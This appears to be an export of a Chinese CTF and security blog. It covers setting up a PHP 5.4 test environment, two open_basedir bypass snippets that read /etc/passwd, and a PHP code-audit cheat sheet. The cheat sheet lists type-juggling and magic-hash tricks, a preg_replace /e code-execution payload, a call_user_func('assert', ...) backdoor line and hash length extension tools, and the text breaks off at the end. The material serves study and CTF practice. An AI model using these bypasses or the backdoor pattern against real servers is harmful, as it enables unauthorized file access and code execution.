href="#配合Mysql" class="headerlink" title="配合Mysql"></a>配合Mysql</h1><h2 id="安装-mysql5-7"><a href="#安装-mysql5-7" class="headerlink" title="安装 mysql5.7"></a>安装 <code>mysql5.7</code></h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span>-get install mysql-client-<span class="hljs-number">5</span>.<span class="hljs-number">7</span> mysql-server-<span class="hljs-number">5</span>.<span class="hljs-number">7</span> -y<br><span class="hljs-comment"># 输入密码</span><br></code></pre></td></tr></table></figure><h2 id="编译安装-mysqlnd-扩展（必须先安装它）"><a href="#编译安装-mysqlnd-扩展（必须先安装它）" class="headerlink" title="编译安装 mysqlnd 扩展（必须先安装它）"></a>编译安装 <code>mysqlnd</code> 扩展（必须先安装它）</h2><p>如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入mysql的ext目录</span><br><span class="hljs-built_in">cd</span> /root/php-5.4.45/ext/mysqlnd<br><span class="hljs-built_in">mv</span> config9.m4 config.m4<br>phpize<br>./configure --with-php-config=$(<span class="hljs-built_in">which</span> php-config)<br><span class="hljs-comment"># 执行 make 命令会出现报错，看下文即可解决，解决后再继续执行如下命令</span><br>make<br></code></pre></td></tr></table></figure><blockquote><p>上述报错如下:</p><p><img src="/../img/2.png"></p><p>执行下列命令即可解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更换php_mysqlnd_config.h为 config.h</span><br>sed -i <span class="hljs-string">&#x27;s|ext/mysqlnd/php_mysqlnd_config.h|ext/mysqlnd/config.h|&#x27;</span> /root/php-5.4.45/ext/mysqlnd/mysqlnd_portability.h<br><span class="hljs-comment"># 更换相对路径为绝对路径</span><br>sed -i <span class="hljs-string">&#x27;s|ext/mysqlnd|/root/php-5.4.45/ext/mysqlnd|&#x27;</span> /root/php-5.4.45/ext/mysqlnd/mysqlnd_portabilit.h<br><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 继续执行命令makemake install# 更改 /home/php/php5445/execdir/lib/php.ini 配置echo extension=mysqlnd.so &gt;&gt; /home/php/php5445/execdir/lib/php.ini</span><br></code></pre></td></tr></table></figure><p>执行 <code>php -a</code> 可看到成功加载<img src="/../img/3.png"></p><h2 id="编译安装-pdo-msyql-扩展"><a href="#编译安装-pdo-msyql-扩展" class="headerlink" title="编译安装 pdo_msyql 扩展"></a>编译安装 <code>pdo_msyql</code> 扩展</h2><p>执行下列命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入 pdo_mysql 源文件夹cd /root/php-5.4.45/ext/pdo_mysql/phpize./configure --with-php-config=$(which php-config) --with-pdo-mysqlmakemake installecho &quot;extension=pdo_mysql.so&quot; &gt;&gt; /home/php/php5445/execdir/lib/php.ini</span><br></code></pre></td></tr></table></figure><p>查看php安装的模块 <code>php -m</code> ，成功安装 pdo_mysql 扩展 <img src="/images/6.png"></p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ol><li>启动环境</li></ol><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"># 启动 mysqlservice mysql restart# 启动 apacheservice apache2 restart<br></code></pre></td></tr></table></figure><ol start="2"><li>更改 index.php 代码</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHANCnRyeSB7DQogICAgJGRiaCA9IG5ldyBQRE8oJ215c3FsOmhvc3Q9MTI3LjAuMC4xO2RibmFtZT1teXNxbCcsICdyb290JywgJ3Jvb3QnKTsNCiAgICBmb3JlYWNoKCRkYmgtPnF1ZXJ5KCdzaG93IGRhdGFiYXNlcycpIGFzICRyb3cpIHsNCiAgICAgICAgcHJpbnRfcigkcm93KTsNCiAgICB9DQogICAgJGRiaCA9IG51bGw7DQp9IGNhdGNoIChQRE9FeGNlcHRpb24gJGUpIHsNCiAgICBwcmludCAiRXJyb3IhOiAiIC4gJGUtPmdldE1lc3NhZ2UoKSAuICI8YnIvPiI7DQogICAgZGllKCk7DQp9DQo/Pg==&quot;</span> |<span class="hljs-built_in">base64</span> -d &gt; /var/www/html/index.php<br></code></pre></td></tr></table></figure><p><img src="/../img/5.png"></p><p>访问 <code>curl localhost:8888</code></p><p><img src="/../img/1.png"></p><p>环境配置成功。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过open_basedir</title>
    <link href="/2024/08/31/%E7%BB%95%E8%BF%87open-basedir/"/>
    <url>/2024/08/31/%E7%BB%95%E8%BF%87open-basedir/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h1><p><a href="https://xz.aliyun.com/t/10070">https://xz.aliyun.com/t/10070</a></p><h2 id="利用ini-set和chidr"><a href="#利用ini-set和chidr" class="headerlink" title="利用ini_set和chidr"></a>利用ini_set和chidr</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li>twitter</li><li><a href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>chdir(<span class="hljs-string">&#x27;subDir&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>$a=file_get_contents(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br>var_dump($a);<br></code></pre></td></tr></table></figure><h2 id="利用symlink"><a href="#利用symlink" class="headerlink" title="利用symlink"></a>利用symlink</h2><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul><li>twitter</li></ul><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="hljs-number">0777</span>,<span class="hljs-literal">TRUE</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html:bar/&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;foo/../../../../../../&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;bar/etc/passwd&#x27;</span>);<br></code></pre></td></tr></table></figure><p>每次要更换文件夹a和bar和foo，不然会报错文件已存在。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其他版本的 php 环境搭建大同小异。</p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php代码审计</title>
    <link href="/2024/08/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/08/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="php函数漏洞"><a href="#php函数漏洞" class="headerlink" title="php函数漏洞"></a>php函数漏洞</h1><h2 id="1"><a href="#1" class="headerlink" title="(1) = == ==="></a>(1) <code>=</code> <code>==</code> <code>===</code></h2><ul><li><code>=</code> 赋值</li><li><code>==</code> 与 <code>!=</code> 将类型转为相同类型再比较<ul><li>字符串中含 <code>.eE</code> 且满足数值在整数范围解释为 <code>float</code>，但 <code>float</code> 中有不是正常的东西就是 <code>0</code></li><li><code>&quot;admin&quot; == 0</code>、<code>&quot;1admin&quot; == 1</code>、<code>&quot;admin1&quot; == 0</code></li><li><code>1 + &quot;bob-1.3e3&quot; == 1</code> </li><li>以 <code>0e</code> 开头的被默认为 <code>0</code></li><li><code>1</code> 表示为 <code>true</code>，<code>0</code> 是 <code>false</code> 和 <code>null</code></li><li>数组表示 <code>null</code> 和 <code>false</code></li><li><code>true == -1</code> </li><li><code>&quot;-1&quot; == -1</code></li><li><code>1.0000000000000001 == 1</code></li></ul></li><li><code>===</code> 与 <code>!==</code> 强比较，类型和值都比<ul><li><code>array === array</code></li><li><code>name[] = a</code></li></ul></li><li>比较漏洞 - 进制比较<ul><li><p>在 PHP 中，只要开头为 <code>0X</code> 的字符串会被认为是 16 进制，在弱类型比较漏洞中，16 进制会先被转换成 10 进制再进行比较，所以只要传入一个带有 <code>0x</code> 的字符串也能够与数字进行比较并且返回 <code>true</code>。</p></li><li><p>在 PHP 中, 如果 <code>bool</code> 和 “任何其他类型” 比较，”任何其他类型” 会转换为 <code>bool</code>。</p></li><li><p>在 PHP 中当转换为 boolean 时，以下值被认为是 <code>FALSE</code>：</p><ol><li>布尔值 <code>FALSE</code> 本身</li><li>整型值 <code>0</code>（零）</li><li>浮点型值 <code>0.0</code>（零）</li><li>空字符串，以及字符串 “0”</li><li>不包括何元素的数组（注意，一旦包含元素，就算包含的元素只是一个空数组，也是 <code>true</code>）</li><li>不包括任何成员变量的对象（仅 PHP 4.0 适用）</li><li>特殊类型 <code>NULL</code>（包括尚未赋值的变量）</li><li>从空标记生成的 SimpleXML 对象</li><li>所有其它值包括 <code>-1</code> 都被认为是 <code>TRUE</code> （包括任何资源）</li></ol></li></ul></li></ul><h2 id="2-intval"><a href="#2-intval" class="headerlink" title="(2) intval"></a>(2) <code>intval</code></h2><ul><li>转换为整型，在 PHP5 左右 <code>intval(a)</code> 与 <code>intval(a + 1)</code>，<code>a</code> 传入 <code>2e5</code> 返回 <code>2</code> 和 <code>200001</code></li><li><code>intval()</code> 转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，<code>intval()</code> 不会报错而是返回 <code>0</code>。</li><li><code>877%00a</code>，再用 <code>intval</code> 函数获取整数部分得到 <code>877</code></li></ul><h2 id="3-md5"><a href="#3-md5" class="headerlink" title="(3) md5"></a>(3) <code>md5</code></h2><ul><li><code>md5 == md5($md5)</code></li><li>常见 MD5 加密后为 <code>0e</code> 开头的字符串为：<code>QNKCDZO</code>、<code>s878926199a</code>、<code>s155964671a</code>、<code>s214587387a</code> 等。</li><li>因为 <code>md5</code> 函数不能处理数组，加密数组的时候会返回 <code>NULL</code>，对于这种情况也可以用来绕过某些场景，除此之外还有 <code>sha1()</code>&#x2F;<code>strlen()</code>&#x2F;<code>strcmp()</code>&#x2F;<code>strpos()</code>。</li><li>对于使用 <code>===</code> 强比较的情况，上述方法均失效。不过可以使用 MD5 加密后的两个完全相等的字符串来进行绕过，可以利用 <code>fastcoll</code> 来生成：<code>fastcoll_v1.0.0.5.exe -p 1.txt -o 1</code></li></ul><h2 id="4-变量覆盖"><a href="#4-变量覆盖" class="headerlink" title="(4) 变量覆盖"></a>(4) 变量覆盖</h2><ol><li><p><strong><code>extract</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">   <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br>   <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;C&quot;</span>);<br>   <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$array</span>);<br>   <br>   - 就会有 `abc` 这几个变量了，并且是 `ABC`。<br>   - `<span class="hljs-title function_ invoke__">extract</span>()` 函数使用数组键名作为变量名，使用数组键值作为变量值，当变量中有同名的元素时，该函数默认将原有的值覆盖掉。<br><br><span class="hljs-number">2</span>. **`parse_str` 函数**<br>   ```php<br>   <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=uert&amp;age=68&quot;</span>, <span class="hljs-variable">$myarr</span>);<br></code></pre></td></tr></table></figure><ul><li>将 <code>name</code> 和 <code>age</code> 传入数组中  </li><li><code>parse_str</code> 函数将字符串解析成多个变量，如果设置了第二个变量 <code>result</code>，变量将会以数组元素的形式存入到这个数组，作为替代。</li></ul></li><li><p><strong><code>$$</code> 变量覆盖</strong></p><ul><li><code>$$</code> 变量覆盖要具体结合代码来看，可能会需要借助某个参数进行传递值，也有可能使用 <code>$GLOBALS</code>（引用全局作用域中可用的全部变量）来做题。</li></ul></li></ol><h2 id="5-伪随机数"><a href="#5-伪随机数" class="headerlink" title="(5) 伪随机数"></a>(5) 伪随机数</h2><ul><li><code>mt_rand</code></li><li><code>mt_srand</code></li></ul><h2 id="6-ereg"><a href="#6-ereg" class="headerlink" title="(6) ereg()"></a>(6) <code>ereg()</code></h2><ul><li>字符串对比解析，<code>ereg</code> 函数存在 <code>NULL</code> 截断漏洞，当 <code>ereg</code> 读取字符串时, 如果遇到了 <code>%00</code>，后面的字符串就不会被解析。</li><li>注：这里的 <code>%00</code> 是需要 <code>urldecode</code> 才可以截断的，这是 URL 终止符，且 <code>%00</code> 长度是 1 不是 3。</li></ul><h2 id="7-is-numeric"><a href="#7-is-numeric" class="headerlink" title="(7) is_numeric()"></a>(7) <code>is_numeric()</code></h2><ul><li>利用数组 + 十六进制来进行绕过：<code>a[]=58B</code> 在 PHP 4.x 和 5.x 中导致这个数组元素被误处理为数字。</li><li>对于空字符 <code>%00</code>，无论是 <code>%00</code> 放在前后都可以判断为非数值，而 <code>%20</code> 空格字符只能放在数值后如 <code>58%20s_numeric()</code> 仍然会认为它是一个数字。</li><li>16 进制也可以绕过 <code>is_numeric()</code> 检验，可以用来绕过 SQL 注入里的过滤。</li><li>对于科学计数法来说转换后会保留 <code>e</code> 前面的数字，所以我们可以利用这个特性绕过。例如：<code>?time=0.5276e7</code></li></ul><h2 id="8-str-replace-find-replace-string-count"><a href="#8-str-replace-find-replace-string-count" class="headerlink" title="(8) str_replace(find, replace, string, count)"></a>(8) <code>str_replace(find, replace, string, count)</code></h2><ul><li>将匹配到的字符串替换为指定内容，不过这个函数可以通过双写来绕过这个替换，利用该特性可以绕过一些关键字替换的情况。</li></ul><h2 id="9-preg-replace-pattern-replacement-subject-limit-count"><a href="#9-preg-replace-pattern-replacement-subject-limit-count" class="headerlink" title="(9) preg_replace(pattern, replacement, subject, limit, count)"></a>(9) <code>preg_replace(pattern, replacement, subject, limit, count)</code></h2><ul><li><p>函数的 <code>/e</code> 匹配模式存在命令执行漏洞，不过单纯的替换字符串来说它并不存在双写绕过这种缺陷。</p></li><li><p><code>/e</code> 修饰符表示执行替换中的 PHP 代码（这是 PHP 5.5 之前的一个特性，现在已经被弃用），<code>/i</code> 修饰符表示匹配时忽略大小写。</p></li><li><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$regex</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$value</span>);<br></code></pre></td></tr></table></figure><p><code>&#39;strtolower(&quot;\\1&quot;)&#39;</code> 是替换部分，其中 <code>\\1</code> 代表第一个捕获组的内容，这里的作用是将匹配到的文本转换为小写。</p></li><li><p>我们让它变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;<span class="hljs-title function_ invoke__">phpinfo</span>()&#125;&#125;);<br></code></pre></td></tr></table></figure></li></ul><h2 id="10-if-preg-match-php-im-a"><a href="#10-if-preg-match-php-im-a" class="headerlink" title="(10) if(preg_match(&#39;/^php$/im&#39;,$a))"></a>(10) <code>if(preg_match(&#39;/^php$/im&#39;,$a))</code></h2><ul><li><code>/m</code> 为多行匹配，<code>/i</code> 不区分大小写，<code>/^php$/</code> <code>^</code> 表示以 <code>php</code> 开头和 <code>$</code> 表示以 <code>php</code> 结尾。</li><li>当出现 <code>%0A</code> 的时候会被当做两行处理，此时只匹配一行，后面的行会自动被忽略。实现绕过。</li><li>如果目标字符串中没有 <code>&quot;\n&quot;</code> 字符，或者模式中没有出现 <code>^</code> 或 <code>$</code>，设置这个修饰符不产生任何影响。</li><li>如果正则表达式是 <code>^xxx$</code>，在末尾加个换行符 <code>%0A</code> 就和没加一样在匹配中，但在对比中就不一样了，利用与匹配和对比中的矛盾。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Match found!&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No match!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 访问以下 URL</span><br><span class="hljs-comment">// http://example.com/script.php?debu=aqua_is_cute%0A</span><br><span class="hljs-comment">// 输出结果: Match found!</span><br></code></pre></td></tr></table></figure><ul><li><code>preg_match(pattern, subject, matches, flags, offset);</code><ul><li><p><code>pattern</code>: 正则表达式模式，用于描述你想要匹配的文本格式。通常用斜杠 <code>/</code> 来包围正则表达式。</p><ul><li><p><code>subject</code>: 要搜索的字符串。</p></li><li><p><code>matches</code>: （可选）数组，返回匹配结果。如果有匹配，<code>matches[0]</code> 包含完全匹配的部分，<code>matches[1]</code> 包含第一个捕获组的匹配内容，依此类推。</p></li><li><p><code>flags</code>: （可选）控制匹配行为的标志，例如是否匹配所有结果（<code>PREG_OFFSET_CAPTURE</code>）。</p></li><li><p><code>offset</code>: （可选）指定从字符串的哪个位置开始搜索。</p><ul><li>常见匹配规则：<ul><li><strong>字符类</strong>：匹配特定字符集中的任意字符。<ul><li><code>[A-Za-z0-9]</code>：匹配任意字母（大写或小写）或数字。</li><li><code>[0-9]</code>：匹配任意数字。</li><li><code>[A-Z]</code>：匹配任意大写字母。</li><li><code>[a-z]</code>：匹配任意小写字母。</li></ul></li><li><strong>数量限定符</strong>：<ul><li><code>+</code>：匹配前一个字符一次或多次（1次或以上）。</li><li><code>*</code>：匹配前一个字符零次或多次（0次或以上）。</li><li><code>?</code>：匹配前一个字符零次或一次（0次或1次）。</li><li><code>&#123;n&#125;</code>：匹配前一个字符恰好 n 次。</li><li><code>&#123;n,&#125;</code>：匹配前一个字符至少 n 次。</li><li><code>&#123;n,m&#125;</code>：匹配前一个字符至少 n 次，但不超过 m 次。</li></ul></li><li><strong>锚点</strong>：<ul><li><code>^</code>：匹配字符串的开始。</li><li><code>$</code>：匹配字符串的结束。</li></ul></li><li><strong>预定义字符类</strong>:<ul><li><code>\d</code> 匹配任意数字（相当于 <code>[0-9]</code>）。</li><li><code>\D</code> 匹配任意非数字字符。</li><li><code>\w</code> 匹配任意字母、数字或下划线（相当于 <code>[a-zA-Z0-9_]</code>）。</li><li><code>\W</code> 匹配任意非字母、非数字或非下划线字符。</li><li><code>\s</code> 匹配任意空白字符（空格、制表符等）。</li><li><code>\S</code> 匹配任意非空白字符。</li></ul></li><li><strong>量词</strong>:<ul><li><code>&#123;n&#125;</code> 精确匹配 n 次。</li><li><code>&#123;n,&#125;</code> 至少匹配 n 次。</li><li><code>&#123;n,m&#125;</code> 匹配 n 到 m 次。</li><li><code>*</code> 匹配零次或多次（相当于 <code>&#123;0,&#125;</code>）。</li><li><code>+</code> 匹配一次或多次（相当于 <code>&#123;1,&#125;</code>）。</li><li><code>?</code> 匹配零次或一次（相当于 <code>&#123;0,1&#125;</code>）。</li><li><code>preg_match(&#39;/a&#123;3&#125;/&#39;, &#39;aaa&#39;)</code> &#x2F;&#x2F; 匹配成功，匹配 “aaa”</li><li><code>preg_match(&#39;/a&#123;2,4&#125;/&#39;, &#39;aaaa&#39;)</code> &#x2F;&#x2F; 匹配成功，匹配 “aaaa”</li></ul></li><li><strong>捕获组</strong>:<ul><li>使用圆括号 <code>()</code> 创建捕获组，捕获组中的内容会被捕获到 <code>matches</code> 数组中。</li><li>示例：<code>/(hello) (world)/</code> 匹配 “hello world”，<code>matches[1]</code> 会是 “hello”，<code>matches[2]</code> 会是 “world”。</li></ul></li><li><strong>选择符 <code>|</code></strong>:<ul><li>用于匹配多个模式中的一个。</li><li>示例：<code>/cat|dog/</code> 匹配 “cat” 或 “dog”。</li></ul></li><li><strong>锚点</strong>:<ul><li><code>^</code> 匹配字符串的开头。</li><li><code>$</code> 匹配字符串的结尾。</li><li>示例：<code>/^hello/</code> 匹配 “hello” 仅当它出现在字符串的开头。</li><li><code>hello$/</code> 匹配 “hello” 仅当它出现在字符串的结尾。</li></ul></li><li><strong>零宽断言</strong>:<ul><li><strong>肯定先行断言</strong> <code>(?=...)</code>：匹配条件前面的位置，但不消耗字符。</li><li><strong>否定先行断言</strong> <code>(?!...)</code>：匹配条件前面的位置，并且不允许后面有特定内容。</li><li><strong>肯定后行断言</strong> <code>(?&lt;=...)</code>：匹配条件后面的位置。</li><li><strong>否定后行断言</strong> <code>(?&lt;!...)</code>：匹配条件后面的位置，但不允许前面有特定内容。</li></ul></li><li><strong>转义字符</strong>：<code>\</code> 用于转义字符，使其具有特殊含义。例如 <code>\d</code> 匹配任何数字，<code>\w</code> 匹配任何单词字符。</li><li><strong><code>(?R)?</code></strong>: 可选的递归匹配，用于处理嵌套函数调用。<code>?</code> 使得它变成可选的，以便处理最内层没有嵌套的函数调用。</li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="11-urldecode-string-str-string"><a href="#11-urldecode-string-str-string" class="headerlink" title="(11) urldecode ( string $str ) : string"></a>(11) <code>urldecode ( string $str ) : string</code></h2><ul><li>解码已编码的 URL 字符串，因为发送请求的时候浏览器会自动进行一次解码，如果在代码中又执行 <code>urldecode</code> 就可能会存在绕过。例如：发送 <code>?id = 1%2527--》php接收到为$id=1%27</code> 如果在执行 <code>$id=urldecode($id)</code> ，最终 <code>$id=1&#39;</code></li></ul><h2 id="12-回调函数"><a href="#12-回调函数" class="headerlink" title="(12) 回调函数"></a>(12) 回调函数</h2><ul><li><p>回调函数是将一个函数作为参数传入另一个函数。由于可以将函数作为参数传入执行，将一些危险的函数作为参数传入，可能成为一个不易检测的后门。在 PHP 中有常用的回调函数：<code>call_user_func</code>、<code>call_user_func_array</code>、<code>array_map</code> 等。</p></li><li><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<br></code></pre></td></tr></table></figure><p><code>assert()</code> 函数直接作为回调函数，以 <code>$_REQUEST[&quot;pass&quot;]</code> 作为 <code>assert</code> 参数调用。</p></li></ul><h2 id="14-比较漏洞-hash-长度扩展攻击"><a href="#14-比较漏洞-hash-长度扩展攻击" class="headerlink" title="(14) 比较漏洞 - hash 长度扩展攻击"></a>(14) 比较漏洞 - hash 长度扩展攻击</h2><p>工具利用：HashPump&#x2F;Hexpand&#x2F;hash_extender</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 setup.py install  <span class="hljs-comment"># 安装Python绑定</span><br>hashpump -h <br></code></pre></td></tr></table></figure><p><strong>HashPump安装</strong>：</p><ol><li><code>git clone https://github.com/bwall/HashPump.git</code></li><li><code>apt-get install g++ libssl-dev</code></li><li><code>cd HashPump</code></li><li><code>make &amp;&amp; make install</code></li></ol><p><strong>利用条件</strong>：</p><ol><li>使用 <code>hash(key || message)</code> 这种方式，且使用了 MD5 或 SHA-1 等基于 Merkle–Damgård 构造的哈希函数生成哈希值；</li><li>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密钥；</li><li>服务器把提交的数据跟密钥构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值。</li></ol><p><strong>扩展</strong>：</p><ul><li>若长度未知，可进行爆破，参考：<a href="https://blog.csdn.net/qq1045553189/article/details/87566846">https://blog.csdn.net/qq1045553189/article/details/87566846</a></li></ul><h2 id="15-array-search"><a href="#15-array-search" class="headerlink" title="(15) array_search"></a>(15) <code>array_search</code></h2><ul><li>是弱类型比较，这意味着在某些情况下，PHP 会将字符串与数字进行比较时转换为相同的类型。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;DGGJ&quot;</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]);<br></code></pre></td></tr></table></figure><ul><li>PHP 会把 <code>DGGJ</code> 转为 <code>0</code>，<code>d === false ? die(&quot;no...&quot;) : NULL;</code>，此时查找的就是 <code>0</code> 在数组里的位置了。我们可以把 <code>0</code> 放在索引为 <code>1</code> 的地方，这样 <code>1 === false</code> 不成立。</li></ul><h2 id="16-create-function"><a href="#16-create-function" class="headerlink" title="(16) create_function"></a>(16) <code>create_function</code></h2><ul><li>代码注入</li><li>从 PHP 7.2.0 开始被标记为已弃用，并在 PHP 8.0.0 中被移除。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&#x27;return $a+$b;&#x27;</span>);<br><span class="hljs-comment">// 等同于</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newfunc</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>;<br>&#125;<br><span 